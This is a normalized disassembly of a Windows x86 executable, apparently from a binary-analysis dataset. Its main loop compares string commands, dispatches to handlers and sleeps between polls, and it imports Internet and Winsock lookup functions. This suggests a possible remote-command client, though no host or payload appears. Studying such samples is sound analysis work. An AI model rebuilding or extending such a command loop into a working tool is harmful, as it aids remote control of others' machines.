sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ esp + 0x1f570 ]
push ecx
push eax
call sub_403fb0
add esp 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ esp + 0x1f570 ]
push edx
push eax
call sub_404060
add esp 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ esp + 0x1f570 ]
push ecx
push eax
call sub_4043f0
add esp 0x8
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ esp + 0x1f570 ]
push edx
push 0x1
push eax
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
call sub_403c80
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov ecx [ esp + 0x1f570 ]
push ecx
push 0x1
push eax
call sub_404110
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov edi [ rw-data ]
cmp edi ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov [ rw-data ] ebx
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
mov [ rw-data ] 0x1
push eax
call [ Sleep@IAT ]
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
push ecx
mov ecx [ esp + 0x1f574 ]
push eax
lea edx [ esp + 0x98 ]
push ecx
push edx
call sub_4030f0
add esp 0x10
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov edx [ esp + 0x1f570 ]
push eax
push ecx
lea eax [ esp + 0x98 ]
push edx
push eax
call sub_402e40
add esp 0x10
jmp r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov esi rw-data
mov eax ebp
push rw-data
call [ printf@IAT ]
add esp 0x4
jmp r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ rw-data ]
cmp edx ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ esp + 0x1f570 ]
mov edi edx
push ecx
push eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push edx
dec ecx
push ebx
push ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
call sub_403430
add esp 0x1c
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov edx [ rw-data ]
cmp edx ebx
je r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ esp + 0x1f570 ]
mov edi edx
push ecx
push eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
push edx
dec ecx
push ebx
push ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
call sub_403430
add esp 0x1c
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov ecx [ esp + 0x1f570 ]
push ecx
push rw-data
push rw-data
push ebx
push 0x6
push 0x6
push rw-data
jmp r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
call sub_403430
add esp 0x1c
mov [ rw-data ] 0x1
jmp r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov eax [ esp + 0x1f570 ]
push eax
push rw-data
push rw-data
push ebx
push 0x2
push 0x2
push rw-data
mov esi rw-data
mov eax ebp
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
cmp [ rw-data ] ebx
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
mov esi rw-data
lea eax [ esp + 0x10 ]
cmp eax ebx
je r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
mov eax [ esp + 0x1f570 ]
not ecx
push eax
push rw-data
dec ecx
push edx
push ebx
push ecx
push ecx
push rw-data
call sub_403430
add esp 0x1c
jmp r-xdata
mov [ rw-data ] ebx
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
cmp eax ebx
jne r-xdata
add eax 0x2
add esi 0x2
cmp cl bl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_405240
mov eax 0xbb8dc
call sub_4053b0
mov eax [ rw-data ]
test eax eax
jne r-xdata
xor eax eax
add esp 0xbb8dc
retn 0x4
push ebp
mov ebp [ atoi@IAT ]
push esi
push edi
lea ecx [ esp + 0x3e8e8 ]
lea edx [ esp + 0xc ]
push ecx
push edx
mov [ rw-data ] eax
call sub_403270
add esp 0x8
test eax eax
je r-xdata
mov eax [ rw-data ]
push eax
jmp r-xdata
mov ecx [ rw-data ]
mov [ rw-data ] 0x0
push ecx
mov ecx 0x7d00
xor eax eax
lea edi [ esp + 0x1f4e8 ]
[ edi ]
lea eax [ esp + 0x3e ]
push eax
call ebp
push eax
call sub_4023f0
lea edi [ esp + 0x6e ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x6e ]
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x1f4f4 ]
push ecx
push edx
call sub_4025f0
add esp 0x14
mov esi rw-data
lea eax [ esp + 0x16 ]
call [ Sleep@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov eax 0x1
cmp ecx eax
jne r-xdata
pop edi
pop esi
xor eax eax
pop ebp
add esp 0xbb8dc
retn 0x4
sbb eax eax
sbb eax 0xffffffff
test cl cl
je r-xdata
lea ecx [ esp + 0x1f4e8 ]
lea edx [ esp + 0x34 ]
push ecx
lea eax [ esp + 0x2e ]
push edx
push eax
push rw-data
call [ printf@IAT ]
add esp 0x10
lea eax [ esp + 0x1f4e8 ]
push eax
push rw-data
call [ printf@IAT ]
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ eax + 0x1 ]
mov cl dl
cmp dl [ esi + 0x1 ]
jne r-xdata
test eax eax
jne r-xdata
add eax 0x2
add esi 0x2
test cl cl
jne r-xdata
mov dl [ eax ]
mov cl dl
cmp dl [ esi ]
jne r-xdata
sub_4053b0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x20
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
and [ ebp - 0x4 ] 0x0
push 0x1
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_405555
cmp [ rw-data ] 0x0
jne r-xdata
call sub_405540
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
call [ __p___initenv@IAT ]
mov ecx [ ebp - 0x20 ]
mov [ eax ] ecx
push [ ebp - 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x1c ]
call sub_402790
add esp 0x30
mov [ ebp - 0x24 ] eax
push eax
call [ exit@IAT ]
push sub_405552
call [ __setusermatherr@IAT ]
pop ecx
sub_4010a0
push esi
mov esi ecx
call sub_4010c0
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_405390
add esp 0x4
sub_4014e0
mov esi [ ebp - 0x18 ]
mov ecx [ esi + 0xc ]
push ecx
call [ InternetCloseHandle@IAT ]
mov [ esi + 0xc ] 0x0
mov eax r-xdata
retn
sub_402750
call sub_402760
jmp sub_402770
sub_402760
mov ecx rw-data
jmp sub_401000
sub_402770
push sub_402780
call sub_40540b
pop ecx
retn
sub_402780
mov ecx rw-data
jmp sub_4010c0
sub_402a3b
mov eax r-xdata
retn
sub_40392f
mov eax sub_403935
retn
sub_403935
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
sub_403950
mov eax 0x1
retn
sub_403b08
mov eax r-xdata
retn
sub_403c62
mov eax r-xdata
retn
sub_405390
push [ esp + 0x4 ]
call free
pop ecx
retn
free
jmp [ free@IAT ]
__CxxFrameHandler
jmp [ __CxxFrameHandler@IAT ]
sub_4053df
cmp [ rw-data ] 0xffffffff
jne r-xdata
push rw-data
push rw-data
push [ esp + 0xc ]
call __dllonexit
add esp 0xc
retn
push [ esp + 0x4 ]
call [ _onexit@IAT ]
pop ecx
retn
sub_40540b
push [ esp + 0x4 ]
call sub_4053df
neg eax
sbb eax eax
pop ecx
neg eax
dec eax
retn
sub_405521
mov esp [ ebp - 0x18 ]
push [ ebp - 0x30 ]
call [ _exit@IAT ]
int3
__dllonexit
jmp [ __dllonexit@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_405540
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_405552
xor eax eax
retn
sub_405555
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostbyname
jmp [ gethostbyname@IAT ]
gethostname
jmp [ gethostname@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
sub_405580
mov eax r--data
jmp __CxxFrameHandler
sub_405590
mov eax r--data
jmp __CxxFrameHandler
sub_4055a0
mov eax r--data
jmp __CxxFrameHandler
sub_4055b0
mov eax r--data
jmp __CxxFrameHandler
sub_4055c0
mov eax r--data
jmp __CxxFrameHandler
sub_4055d0
mov eax r--data
jmp __CxxFrameHandler
